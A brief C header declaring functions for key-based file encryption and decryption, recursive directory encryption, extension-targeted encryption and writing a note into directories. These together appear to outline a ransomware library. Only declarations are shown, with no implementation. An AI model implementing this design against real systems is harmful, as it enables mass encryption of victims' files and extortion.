#ifndef AWARE_LIB_H
#define AWARE_LIB_H

#include <stdlib.h>

void f_encrypt(const char *filename, const unsigned char *key);
void f_decrypt(const char *filename, const unsigned char *key);

void e_scan(const char *directory, const unsigned char *key);
void d_scan(const char *directory, const unsigned char *key);

void e_fex(const char *directory, const unsigned char *key, const char *f_extension);

void c_note(const char *directory, const char *message);

#endif
